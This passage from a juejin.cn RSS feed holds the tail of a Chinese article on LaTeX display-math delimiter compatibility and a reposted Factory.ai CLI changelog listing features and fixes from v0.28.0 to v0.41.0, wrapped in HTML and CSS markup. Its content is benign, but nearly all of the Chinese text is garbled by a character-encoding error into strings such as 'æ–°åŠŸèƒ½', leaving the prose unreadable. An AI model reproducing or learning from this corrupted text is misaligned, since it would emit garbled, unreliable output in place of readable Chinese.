align="left">âŒï¼ˆéœ€ç‰¹æ®Šå¤„ç†ï¼‰</td><td align="left">âŒ</td><td align="left">GitHubä¸ºå®‰å…¨é»˜è®¤ç¦ç”¨</td></tr><tr><td align="left"><strong>Jupyter Notebook</strong></td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">ä¸¤è€…éƒ½æ”¯æŒ</td></tr><tr><td align="left"><strong>Stack Exchangeï¼ˆå¦‚Math.SEï¼‰</strong></td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">ä¸¤è€…éƒ½æ”¯æŒ</td></tr><tr><td align="left"><strong>æŸäº›æ—§ç‰ˆè®ºå›/åšå®¢</strong></td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">å¯èƒ½åªè¯†åˆ«<code>$$</code></td></tr><tr><td align="left"><strong>Obsidianï¼ˆé»˜è®¤ï¼‰</strong></td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">ä¸¤è€…éƒ½æ”¯æŒ</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-8"><strong>ä¸‰ã€æœ€ä½³å®è·µå»ºè®®</strong></h4>
<p>ä¸ºäº†ä¿è¯<strong>æœ€å¤§å…¼å®¹æ€§</strong>ï¼Œå°¤å…¶åœ¨<strong>ç½‘é¡µã€Markdownã€æŠ€æœ¯è®ºå›</strong>ç­‰ä¸ç¡®å®šæ¸²æŸ“å™¨é…ç½®çš„ç¯å¢ƒä¸­ï¼š</p>
<h5 data-id="heading-9"><strong>å»ºè®®1ï¼šä½¿ç”¨ <code>$$ ... $$</code>ï¼ˆæœ€å®‰å…¨ï¼‰</strong></h5>
<pre><code class="hljs language-latex" lang="latex">$$
\text{æŒ‡æ•°} = \frac{80}{114.2857} \times 1000 \approx 700 \ \text{ç‚¹}
$$
</code></pre>
<p>è¿™æ ·å†™å‡ ä¹èƒ½åœ¨<strong>æ‰€æœ‰åœºæ™¯</strong>ä¸‹å·¥ä½œã€‚</p>
<h5 data-id="heading-10"><strong>å»ºè®®2ï¼šæ˜ç¡®ä½¿ç”¨ <code>\displaystyle</code>ï¼ˆå¦‚æœéœ€è¦è¡Œå†…æ˜¾ç¤ºæ•°å­¦æ ·å¼ï¼‰</strong></h5>
<p>å¦‚æœæ‚¨éœ€è¦åœ¨è¡Œå†…æ’å…¥å¤æ‚å…¬å¼ï¼ˆå¦‚åˆ†æ•°ï¼‰ï¼Œä½†ç¯å¢ƒåªæ”¯æŒ<code>$...$</code>ï¼ˆè¡Œå†…æ¨¡å¼ï¼‰ï¼Œå¯ä»¥ï¼š</p>
<pre><code class="hljs language-latex" lang="latex">$ \displaystyle \frac{80}{114.2857} \times 1000 \approx 700 $ ç‚¹
</code></pre>
<p>ï¼ˆ<code>\displaystyle</code>ä¼šä½¿å…¬å¼åƒæ˜¾ç¤ºæ¨¡å¼ä¸€æ ·æ¸²æŸ“ï¼‰</p>
<hr/>
<h4 data-id="heading-11"><strong>å››ã€å›åˆ°æˆ‘ä»¬çš„ä¾‹å­</strong></h4>
<p>å¦‚æœä¸ºäº†<strong>ç»å¯¹å…¼å®¹</strong>ï¼Œæˆ‘åº”è¯¥å°†ä¹‹å‰çš„å…¬å¼å†™æˆï¼š</p>
<pre><code class="hljs language-latex" lang="latex">$$
\text{æŒ‡æ•°} = \frac{80}{114.2857} \times 1000 \approx 700 \ \text{ç‚¹}
$$
</code></pre>
<p>æˆ–è€…ï¼Œå¦‚æœæ¸²æŸ“å™¨éå¸¸åŸºç¡€ï¼Œç”šè‡³è¦é¿å…ä½¿ç”¨ <code>\text{}</code>ï¼š</p>
<pre><code class="hljs language-latex" lang="latex">$$
æŒ‡æ•° = \frac{80}{114.2857} \times 1000 \approx 700 \ ç‚¹
$$
</code></pre>
<p>ï¼ˆè™½ç„¶ä¸æ ‡å‡†ï¼Œä½†æŸäº›ä»…æ”¯æŒåŸºæœ¬æ•°å­¦å‘½ä»¤çš„è§£æå™¨å¯èƒ½åªèƒ½è¿™æ ·å¤„ç†ä¸­æ–‡ï¼‰</p>
<hr/>
<h4 data-id="heading-12"><strong>äº”ã€æ€»ç»“</strong></h4>
<ul>
<li><strong><code>$$</code> æ˜¯â€œæœ€å¤§å…¬çº¦æ•°â€</strong>ï¼Œå…¼å®¹æ€§æœ€å¥½ï¼Œå°¤å…¶åœ¨ç½‘ç»œç¯å¢ƒã€‚</li>
<li><strong><code>\[ \]</code> æ›´æ ‡å‡†</strong>ï¼Œä½†åœ¨éå®Œæ•´LaTeXç¯å¢ƒä¸­å¯èƒ½å¤±æ•ˆã€‚</li>
<li><strong>åœ¨ä¸ç¡®å®šæ—¶ï¼Œä¼˜å…ˆç”¨ <code>$$</code></strong>ã€‚</li>
<li><strong>é‡è¦æ–‡æ¡£ä¸­ï¼Œå…ˆæµ‹è¯•ç›®æ ‡å¹³å°çš„æ¸²æŸ“æ”¯æŒæƒ…å†µ</strong>ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Factory.ai CLI æ›´æ–°æ—¥å¿—ï¼ˆæŒç»­æ›´æ–°ï¼‰]]></title>    <link>https://juejin.cn/post/7590104561476091956</link>    <guid>https://juejin.cn/post/7590104561476091956</guid>    <pubDate>2026-01-02T14:24:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561476091956" data-draft-id="7590159073988919348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Factory.ai CLI æ›´æ–°æ—¥å¿—ï¼ˆæŒç»­æ›´æ–°ï¼‰"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-02T14:24:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜¯é­”ä¸¸å•Š"/> <meta itemprop="url" content="https://juejin.cn/user/3217622495411292"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Factory.ai CLI æ›´æ–°æ—¥å¿—ï¼ˆæŒç»­æ›´æ–°ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3217622495411292/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜¯é­”ä¸¸å•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T14:24:59.000Z" title="Fri Jan 02 2026 14:24:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.factory.ai%2Fchangelog%2Fcli-updates" target="_blank" title="https://docs.factory.ai/changelog/cli-updates" ref="nofollow noopener noreferrer">è½¬è½½</a></p>
<h2 data-id="heading-0">12æœˆ30æ—¥ v0.41.0</h2>
<h3 data-id="heading-1">æ–°åŠŸèƒ½</h3>
<p><strong>/wrapped å‘½ä»¤</strong> - å¹´åº¦å›é¡¾ç»Ÿè®¡ï¼Œå±•ç¤ºæ‚¨çš„ Droid ä½¿ç”¨æƒ…å†µã€è·å¾—çš„å¾½ç« ã€æ¨¡å‹åå¥½å’Œä¼šè¯æŒ‡æ ‡ (cli)</p>
<p><strong>å¿«é€Ÿæ¨¡å‹åˆ‡æ¢</strong> - æ— éœ€ LLM compaction å³å¯æ›´å¿«åœ°åˆ‡æ¢ provider/model (cli)</p>
<p><strong>æ‰¹é‡ tool æƒé™</strong> - å¹¶è¡Œ tool è°ƒç”¨ç°åœ¨æ˜¾ç¤ºå•ä¸ªæƒé™æç¤º (cli)</p>
<p><strong>è‡ªå®šä¹‰ BYOK models</strong> - è‡ªå®šä¹‰ models ç°åœ¨å‡ºç°åœ¨ model selector ä¸­ (cli)</p>
<p><strong>è‡ªåŠ¨åŒæ­¥ä»“åº“</strong> - æ‰“å¼€ template modal æ—¶è‡ªåŠ¨åŒæ­¥ GitHub/GitLab ä»“åº“ (app)</p>
<h3 data-id="heading-2">æ”¹è¿›</h3>
<p><strong>PDF å’Œæ–‡æœ¬æ–‡ä»¶ä¸Šä¼ </strong> - åœ¨ Web/Desktop apps çš„èŠå¤©ä¸­é™„åŠ  PDF å’Œæ–‡æœ¬æ–‡ä»¶ (app)</p>
<p><strong>å‘é€æŒ‰é’®</strong> - ä¼šè¯èŠå¤©è¾“å…¥ä¸­çš„å¯è§†åŒ–å‘é€æŒ‰é’® (app)</p>
<p><strong>ASCII å¯åŠ¨åŠ¨ç”»</strong> - CLI å¯åŠ¨æ—¶çš„åŠ¨ç”» Droid logoï¼ˆå¯é…ç½®ï¼‰(cli)</p>
<p><strong>Token å€ç‡æ˜¾ç¤º</strong> - åœ¨ model æè¿°ä¸­æ˜¾ç¤º Factory token è´¹ç‡ (cli)</p>
<h3 data-id="heading-3">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ç”¨æˆ·å¡åœ¨æŸåçš„ onboarding çŠ¶æ€ä¸­çš„é—®é¢˜ (app)</li>
<li>ä¿®å¤ä»…ä½¿ç”¨ terminal çš„ç”¨æˆ·çš„ CLI onboarding é‡å®šå‘é—®é¢˜</li>
<li>ä¿®å¤ GitHub org ç®¡ç† modal ä¸­ç¼ºå¤±ä»“åº“çš„é—®é¢˜ (app)</li>
<li>ä¿®å¤å¤šé€‰é¡¹ spec mode é€‰æ‹©é—®é¢˜ (cli)</li>
<li>ä¿®å¤é˜»æ­¢è®¢é˜…å¯åŠ¨çš„ catch-22 bug (app)</li>
</ul>
<h2 data-id="heading-4">12æœˆ23æ—¥ v0.40.0</h2>
<h3 data-id="heading-5">æ–°åŠŸèƒ½</h3>
<p><strong>ä» settings åŠ è½½è‡ªå®šä¹‰ models</strong> - ç›´æ¥ä» settings.json åŠ è½½è‡ªå®šä¹‰ models</p>
<p><strong>å¹¶è¡Œ tool ç¡®è®¤</strong> - å¹¶è¡Œ tool è°ƒç”¨ä½¿ç”¨å•ä¸ªæƒé™è¯·æ±‚ï¼Œè€Œä¸æ˜¯é€ä¸ªæç¤º</p>
<p><strong>å¤šé€‰é¡¹ spec mode</strong> - Spec mode ç°åœ¨å¯ä»¥å‘ˆç°å¤šä¸ªå®ç°é€‰é¡¹ä¾›ç”¨æˆ·é€‰æ‹©</p>
<p><strong>Settings æ–‡ä»¶ç›‘è§†</strong> - Settings æ–‡ä»¶æ›´æ”¹æ—¶è‡ªåŠ¨é‡æ–°åŠ è½½</p>
<p><strong>Exec mode ä¸­çš„ token ä½¿ç”¨æƒ…å†µ</strong> - Token ä½¿ç”¨æƒ…å†µç°åœ¨æ˜¾ç¤ºåœ¨ exec streaming è¾“å‡ºä¸­</p>
<p><strong>Stop hook æ”¹è¿›</strong> - Stop hook çš„å†³ç­–å’ŒåŸå› æ”¯æŒï¼Œä»¥åŒ¹é… Claude code spec</p>
<h3 data-id="heading-6">Bug ä¿®å¤</h3>
<ul>
<li><strong>Opus 4.5 model ä¿®å¤</strong> - ä¿®å¤ Opus 4.5 ä½œä¸º effort model å·¥ä½œï¼Œæ”¹è¿› thinking guard</li>
<li><strong>Tool å®Œæˆä¿®å¤</strong> - ä¿®å¤ tools åœ¨æ–° assistant æ¶ˆæ¯ä¸Šæœªæ­£ç¡®å®Œæˆçš„é—®é¢˜</li>
<li><strong>Web æœç´¢æ—¥æœŸä¿®å¤</strong> - Web search tool ç°åœ¨åŒ…å«åŠ¨æ€æ—¥æœŸä»¥è·å¾—æ›´å‡†ç¡®çš„ç»“æœ</li>
</ul>
<h2 data-id="heading-7">12æœˆ19æ—¥ v0.39.0</h2>
<h3 data-id="heading-8">æ–°åŠŸèƒ½</h3>
<p><strong>ä¸Šä¸‹æ–‡åˆ©ç”¨ç‡è®¾ç½®</strong> - æ–°è®¾ç½®å¯åœ¨çŠ¶æ€æ ä¸­æ˜¾ç¤º token ä½¿ç”¨æŒ‡ç¤ºå™¨</p>
<p><strong>é»˜è®¤å¯ç”¨è‡ªå®šä¹‰ Droids</strong> - è‡ªå®šä¹‰ Droids åŠŸèƒ½ç°åœ¨å¯¹æ‰€æœ‰ç”¨æˆ·å¯ç”¨ï¼Œæ— éœ€é€‰æ‹©åŠ å…¥</p>
<h3 data-id="heading-9">Bug ä¿®å¤</h3>
<ul>
<li><strong>Grep tool ä¿®å¤</strong> - ä¿®å¤ Grep tool ä¸­çš„ pattern å‚æ•°å¤„ç†</li>
<li><strong>BYOK Grok ä¿®å¤</strong> - ä¿®å¤ä½¿ç”¨ Grok models ä¸ thinking/reasoning streams æ—¶çš„å´©æºƒ</li>
<li><strong>Warmup æ”¹è¿›</strong> - æ·»åŠ ç¦ç”¨ warmup è¯·æ±‚çš„é€‰é¡¹ï¼Œå¹¶ä¸ºæ–œæ å‘½ä»¤è·³è¿‡ warmup</li>
<li><strong>é git ç›®å½•æ”¯æŒ</strong> - å½“ä¸åœ¨ git ä»“åº“ä¸­æ—¶ï¼Œä½¿ç”¨å½“å‰å·¥ä½œç›®å½•ä½œä¸ºé¡¹ç›®ç›®å½•</li>
</ul>
<h2 data-id="heading-10">12æœˆ18æ—¥ v0.38.0</h2>
<h3 data-id="heading-11">Bug ä¿®å¤</h3>
<p><strong>GPT-5.2 æ”¹è¿›</strong> - ä¿®å¤è¯·æ±‚å‚æ•°å’Œ reasoning effort é€‰é¡¹ï¼Œä»¥è·å¾—æ›´å¥½çš„ model æ€§èƒ½</p>
<p><strong>é˜²æ­¢ .env è‡ªåŠ¨åŠ è½½</strong> - CLI åœ¨ç‹¬ç«‹æ„å»ºä¸­ä¸å†è‡ªåŠ¨ä»å·¥ä½œç›®å½•åŠ è½½ .env æ–‡ä»¶ï¼Œä½¿è¡Œä¸ºæ›´å¯é¢„æµ‹</p>
<h2 data-id="heading-12">12æœˆ17æ—¥ v0.37.0</h2>
<h3 data-id="heading-13">æ”¹è¿›</h3>
<p><strong>Todo tool æ”¹è¿›</strong> - ç®€åŒ– todo æ ¼å¼å¹¶åˆ·æ–° UI ä»¥æé«˜å¯é æ€§</p>
<p><strong>Chrome DevTools MCP server</strong> - å°† Chrome DevTools Protocol æ·»åŠ åˆ° MCP registry</p>
<p><strong>Model æ¸…ç†</strong> - åˆ é™¤è¿‡æ—¶çš„ models</p>
<h3 data-id="heading-14">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ Codex models çš„ API è¯·æ±‚å¤„ç†</li>
</ul>
<h2 data-id="heading-15">12æœˆ17æ—¥ v0.36.6</h2>
<h3 data-id="heading-16">æ–°åŠŸèƒ½</h3>
<p><strong>Gemini 3 Flash model</strong> - æ·»åŠ å¯¹ Gemini 3 Flash çš„æ”¯æŒ</p>
<h3 data-id="heading-17">æ”¹è¿›</h3>
<p><strong>Agent å°±ç»ªä¿¡å·</strong> - åœ¨ readiness æŠ¥å‘Šä¸­æ‰©å±• agent å°±ç»ªä¿¡å·</p>
<h3 data-id="heading-18">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤è¿‡äºä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå…è®¸å¸¸è§çš„åªè¯» git å‘½ä»¤</li>
<li>ä¿®å¤ WSL ä¸Šçš„å¤åˆ¶/ç²˜è´´é—®é¢˜</li>
<li>ä¿®å¤ /readiness æŠ¥å‘Šä¸­çš„ä»“åº“å»é‡é—®é¢˜</li>
</ul>
<h2 data-id="heading-19">12æœˆ13æ—¥ v0.36.2</h2>
<h3 data-id="heading-20">æ–°åŠŸèƒ½</h3>
<p><strong>GPT-5.2 model</strong> - æ·»åŠ å¯¹ GPT-5.2 model çš„æ”¯æŒ</p>
<p><strong>MCP tool å¯ç”¨/ç¦ç”¨</strong> - æ·»åŠ æŒ‰ server å¯ç”¨/ç¦ç”¨å•ä¸ª MCP tools çš„èƒ½åŠ›</p>
<h2 data-id="heading-21">12æœˆ10æ—¥ v0.36.0</h2>
<h3 data-id="heading-22">æ–°åŠŸèƒ½</h3>
<p><strong>Droid åˆ›å»ºä¸­çš„ MCP tools</strong> - MCP tools ç°åœ¨åœ¨è‡ªå®šä¹‰ droid åˆ›å»ºå’Œç¼–è¾‘æµç¨‹ä¸­æ˜¾ç¤º</p>
<h3 data-id="heading-23">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤æ–‡ä»¶åä¸å…ƒæ•°æ®åç§°ä¸åŒ¹é…æ—¶çš„ droid åˆ é™¤é—®é¢˜</li>
<li>æ ‡å‡†åŒ– droid åˆ›å»º/ç¼–è¾‘æµç¨‹ä¸­çš„å¸®åŠ©æ–‡æœ¬ä½ç½®å’Œæ ¼å¼</li>
<li>å°† reasoning_effort æ·»åŠ åˆ° stream-json ç³»ç»Ÿåˆå§‹åŒ–äº‹ä»¶</li>
</ul>
<h2 data-id="heading-24">12æœˆ8æ—¥ v0.33.0</h2>
<h3 data-id="heading-25">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ autonomy mode åœ¨ tool ç¡®è®¤æ—¶æœªæ­£ç¡®è®¾ç½®çš„é—®é¢˜</li>
<li>é€šè¿‡å­—ç¬¦è®¡æ•°æ”¹è¿› @-tagged æ–‡ä»¶æˆªæ–­ï¼Œä»¥é˜²æ­¢ä¸Šä¸‹æ–‡æº¢å‡º</li>
<li>ä½¿ç”¨å¯å…³é—­é€šçŸ¥æ›´æ–° Opus 4.5 å®šä»·</li>
<li>å°† Figma MCP server æ¢å¤åˆ° registry</li>
</ul>
<h2 data-id="heading-26">12æœˆ5æ—¥ v0.32.0</h2>
<h3 data-id="heading-27">Bug ä¿®å¤</h3>
<ul>
<li>æŒ‰ ESC å…³é—­æ‰©å±•çš„ tool ç»“æœè§†å›¾</li>
<li>æ”¹è¿›è¾“å…¥æ¡†å…‰æ ‡åœ¨æ¢è¡Œæ—¶çš„ä¸Š/ä¸‹ç§»åŠ¨</li>
<li>ä¿®å¤ Windows ç²˜è´´é—®é¢˜</li>
<li>ä¿®å¤ npm run format ä¸ Windows ä¼ ç»Ÿ format å‘½ä»¤åœ¨ denylist ä¸­çš„å†²çª</li>
<li>ä¿®å¤ Microsoft MCP servers çš„èº«ä»½éªŒè¯é—®é¢˜</li>
<li>/readiness å‘½ä»¤ç°åœ¨é»˜è®¤å¯ç”¨</li>
</ul>
<h2 data-id="heading-28">12æœˆ4æ—¥ v0.31.0</h2>
<h3 data-id="heading-29">æ–°åŠŸèƒ½</h3>
<p><strong>GPT-5.1-Codex-Max model</strong> - æ·»åŠ å¯¹ GPT-5.1-Codex-Max model çš„æ”¯æŒ</p>
<p><strong>å›¾åƒå‹ç¼©</strong> - å›¾åƒç°åœ¨åœ¨ä¸Šä¼ å‰å‹ç¼©ä»¥å‡å°‘å¸¦å®½</p>
<p><strong>IDE è‡ªåŠ¨è¿æ¥è®¾ç½®</strong> - æ·»åŠ ä»å¤–éƒ¨ terminals è‡ªåŠ¨è¿æ¥åˆ° IDE çš„è®¾ç½®</p>
<p><strong>ç¦ç”¨ hooks æ ‡å¿—</strong> - æ·»åŠ  --no-hooks æ ‡å¿—ä»¥ç¦ç”¨ hooks æ‰§è¡Œ</p>
<h3 data-id="heading-30">Bug ä¿®å¤</h3>
<ul>
<li>æ”¹è¿› Droid docs æœç´¢</li>
<li>é•¿ Execute tool å‘½ä»¤ç°åœ¨åœ¨ UI header ä¸­æˆªæ–­</li>
<li>ä¿®å¤ç£ç›˜ä¸Šçš„å›¾åƒåœ¨ä¸Šä¼ åæœªè¢«æ¸…é™¤çš„é—®é¢˜</li>
<li>ä¿®å¤ thinking level åœ¨å¯¹è¯ä¸­é€”æ›´æ”¹çš„é—®é¢˜ï¼Œé€šè¿‡åœ¨æ¯ä¸ª agent turn ä¸­é”å®šå®ƒ</li>
<li>ä¿®å¤ review preset é¡¹å¯¹æœªé€‰ä¸­é¡¹ä½¿ç”¨é”™è¯¯é¢œè‰²çš„é—®é¢˜</li>
<li>ä¿®å¤è¾“å…¥æ¡†å¤„ç†å¤šå®½åº¦å­—ç¬¦ï¼ˆå¦‚ CJK å’Œ emojiï¼‰çš„é—®é¢˜</li>
<li>ä¿®å¤ @ å»ºè®®èœå•æ‰“å¼€æ—¶çš„å·¦/å³ç®­å¤´é”®å¯¼èˆª</li>
<li>æ†ç»‘ä»£ç ç­¾åçš„ ripgrep äºŒè¿›åˆ¶æ–‡ä»¶ä»¥æé«˜å®‰å…¨æ€§å’Œå¯é æ€§</li>
</ul>
<h2 data-id="heading-31">12æœˆ3æ—¥ v0.30.0</h2>
<h3 data-id="heading-32">æ–°åŠŸèƒ½</h3>
<p><strong>æœç´¢éšè—æ–‡ä»¶</strong> - Grep å’Œ Glob tools ç°åœ¨åœ¨æœç´¢ç»“æœä¸­åŒ…å«éšè—æ–‡ä»¶</p>
<p><strong>ä¼šè¯æœç´¢</strong> - å‘ä¼šè¯é€‰æ‹©å™¨æ·»åŠ æœç´¢åŠŸèƒ½ï¼Œä»¥å¿«é€ŸæŸ¥æ‰¾ä¼šè¯</p>
<p><strong>å›¾åƒæŒ‡ç¤ºå™¨</strong> - ç”¨æˆ·æ¶ˆæ¯ç°åœ¨åœ¨é™„åŠ å›¾åƒæ—¶æ˜¾ç¤ºå›¾åƒæŒ‡ç¤ºå™¨</p>
<h3 data-id="heading-33">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤æŸäº›æ–‡ä»¶æ“ä½œçš„ EPERM æƒé™é”™è¯¯ - Windows æ–‡ä»¶é‡å‘½åé‡è¯•é€»è¾‘</li>
<li>ä¿®å¤ Ghostty terminal ä¸­ /review å’Œ /bg-process å‘½ä»¤çš„ ESC é”®å¯¼èˆª</li>
<li>MCP registry æ›´æ–°</li>
</ul>
<h2 data-id="heading-34">12æœˆ2æ—¥ v0.28.1</h2>
<h3 data-id="heading-35">æ”¹è¿›</h3>
<p><strong>è¯ä¹¦ç¼“å­˜</strong> - è¯ä¹¦ç°åœ¨åœ¨å¯åŠ¨æ—¶ç¼“å­˜ä»¥åŠ å¿«åŠ è½½é€Ÿåº¦</p>
<p><strong>å›¾åƒä¸Šä¼ é™åˆ¶</strong> - å¯¹è¯å›¾åƒç°åœ¨å—åˆ°é™åˆ¶ï¼Œä»¥é˜²æ­¢ä¸Šä¼ å¤§å›¾åƒæ—¶å‡ºç° 413 é”™è¯¯</p>
<p><strong>MCP registry helper</strong> - åœ¨ MCP registry ä¸­ä¸º STDIO servers æ·»åŠ æ³¨é‡Šï¼Œè§£é‡Šå®‰è£…è¦æ±‚</p>
<h3 data-id="heading-36">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ assistant æ¶ˆæ¯ä¸­æ–­å thinking block ä¸­çš„æ— æ•ˆç­¾å</li>
<li>ä¿®å¤å¼‚æ­¥åŠ è½½æ—¶ settings èœå•æœªæ˜¾ç¤ºæ‰€æœ‰é€‰é¡¹çš„é—®é¢˜</li>
</ul>
<h2 data-id="heading-37">12æœˆ1æ—¥ v0.28.0</h2>
<h3 data-id="heading-38">æ–°åŠŸèƒ½</h3>
<p><strong>æ˜¾ç¤ºæ‰€æœ‰ä¼šè¯</strong> - è·¨ç›®å½•æŸ¥çœ‹å’Œç®¡ç†æ‰€æœ‰ä¼šè¯</p>
<p><strong>çª—å£åŒ–æ–œæ å‘½ä»¤å¯¼èˆª</strong> - æ”¹è¿›æ–œæ å‘½ä»¤èœå•ä¸­çš„å¯¼èˆªï¼Œæ”¯æŒçª—å£åŒ–æ»šåŠ¨</p>
<p><strong>æ”¹è¿› thinking æ˜¾ç¤º</strong> - é‡æ„ thinking block æ¸²æŸ“ä»¥æé«˜æ¸…æ™°åº¦</p>
<p><strong>Figma MCP server</strong> - æ·»åŠ å¯¹ Figma MCP server é›†æˆçš„æ”¯æŒ</p>
<h3 data-id="heading-39">Bug ä¿®å¤</h3>
<ul>
